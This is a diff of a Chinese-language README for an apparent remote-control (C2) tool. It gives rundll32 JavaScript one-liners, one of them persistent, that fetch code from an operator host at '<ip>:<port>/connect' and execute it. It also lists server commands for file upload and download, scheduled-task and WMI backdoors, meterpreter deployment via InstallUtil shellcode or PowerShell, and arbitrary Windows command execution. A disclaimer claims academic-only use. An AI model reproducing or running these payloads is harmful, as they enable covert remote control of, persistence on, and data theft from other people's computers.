@@ -10,33 +10,38 @@
 程序依赖flask和sqlite3，自行pip安装
 
 ##客户端
-把`<server>:<ip>`替换成实际上线的地址
+把`<ip>:<port>`替换成实际上线的地址
 
 正常版
 
 ```
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://<server>:<ip>/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://<ip>:<port>/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){windows.close();}
 ```
 
 不死版
 
 ```
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://<server>:<ip>/connect",false);while(1){try{h.Send();B=h.ResponseText;eval(B);}catch(e){}}
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://<ip>:<port>/connect",false);while(1){try{h.Send();B=h.ResponseText;eval(B);}catch(e){}}
 ```
 
 ##服务端
-后台： http://<server>:<ip>/server/
+后台： `http://<ip>:<port>/server/`
 
 服务端支持的命令有
 
-* sessions  列出活动的客户端
-* use <id>  根据id选择客户端
-* show globals/downloads/uploads  查看全局变量、客户端能下载的文件、客户端上传的文件
-* delete session  删除当前客户端
-* delete download/upload <id> 按照id删除文件
-* upfile  上传文件到服务器，并添加到downloads列表
-* download  设置好download_file和download_save_path两个变量即可让客户端下载文件并保存到download_save_path
-* upload  设置upload_file变量，即可让客户端把upload_file的文件上传到服务器
+* `sessions`  列出活动的客户端
+* `use <id>`  根据id选择客户端
+* `set <key> <value>`    设置全局变量
+* `show globals/downloads/uploads`  查看全局变量、客户端能下载的文件、客户端上传的文件
+* `delete session`  删除当前客户端
+* `delete download/upload <id>` 按照id删除文件
+* `upfile`  上传文件到服务器，并添加到downloads列表
+* `download`  设置好download_file和download_save_path两个变量即可让客户端下载文件并保存到download_save_path
+* `upload`  设置upload_file变量，即可让客户端把upload_file的文件上传到服务器
+* `backdoor tasks <time>`  利用windows任务计划留后门，时间格式为00：00
+* `backdoor wmi`  利用wmi留后门，每一小时执行一次
+* `meterpreter shellcode`  InstallUtil执行shellcode方式种meterpreter，需要先设置LHOST和LPORT(migrate之后才能继续接受命令，依赖.NET Framework 2.0)
+* `meterpreter powershell`  Powershell方式种meterpreter(依赖powershell 1.0)
 
 除了上述的命令，其他均会被当做windows的系统命令来执行
 
@@ -63,13 +68,23 @@ https://gist.github.com/subTee/f1603fa5c15d5f8825c0
 
 http://drops.wooyun.org/tips/11764
 
+http://drops.wooyun.org/tips/8290
+
+http://drops.wooyun.org/tips/12354
+
 https://github.com/chromakode/xkcdfools
 
 http://www.kammerl.de/ascii/AsciiSignature.php
+
+##免责声明
+使用本工具请遵守当地法律，仅能用作学术测试使用，严禁非法控制他人计算机。如果造成损害，与作者无关。
+
+##License
+GPLV3
 
 ##TODO
 * 完善命令
 * heartbeat随任务量来决定sleep时间
 * 通信流量加密
-* 修改执行命令payload在客户端不出现黑框
+* meterpreter
 
